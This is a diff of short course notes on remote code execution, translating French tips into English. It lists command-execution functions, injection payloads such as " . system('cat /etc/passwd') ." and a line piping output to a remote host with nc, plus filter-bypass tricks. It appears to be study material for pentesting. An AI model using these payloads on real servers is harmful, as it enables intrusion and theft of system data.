@@ -1,16 +1,16 @@
 # RCE
 
-## Principe
+## Generalities
 
-* J'ignore si l'abréviation RCE correspond à _Remote Code Execution_ ou _Remote Command Execution_, les deux étaient utilisés pour le même genre de failles dans le cours.
-* Possibilité d'exécuter des commandes de l'OS sur le serveur.
+* I'm not sure if it stands for _**Remote Code Execution**_ or _**Remote Command Execution**_
+* It allows us to execute commands on the server
 
 ## Language specifics to run commands
 
 * PHP
-  * `system("command")`
+  * `system(<command>)`
 * Python
-  * `os.system("command")` and variants
+  * `os.system(<command>)` and variants
   * Do that inside an `str()`
   * If you need to import os.system, use this function in str\(\) : `__import__('os').system(...)`
 * Ruby
@@ -19,11 +19,10 @@
 ## General tips & trick
 
 * A basic OS command for test is `uname` \(but i suppose it would work only on a linux system\)
-* Si le résultat n'est pas reflété, utiliser à la place `sleep 10` pour voir si la commande a bien été injectée
-  * To send back result when it's not reflected, simply pipe it to nc : `whoami | nc <ip> <port>` \(given that the remote server has nc of course\)
+* If the result isn't reflected, use `sleep` or pipe it to nc to send it back to you `whoami | nc <ip> <port>`
 * When your payload is included inside a string, **use concatenation** : `" . system('cat /etc/passwd') ."`
 * Don't forget to **urlencode**
-* If some characters seems to be sanitized when the request first arrive, try to base64 encode them. Since the code you inject is executed, you can make the server decode it the moments it uses it.
+* If some characters seems to be sanitized when the request first arrive, try to base64 encode them.Since the code you inject is executed, you can make the server decode it the moments it uses it.
 * Bypass sanitation :
   * If the `/` is sanitize, you can usually get it by echoing the home directory `echo $HOME`
   * Si un autre caractère est sanitize et qu'il existe dans une variable d'env, on peut faire ça :
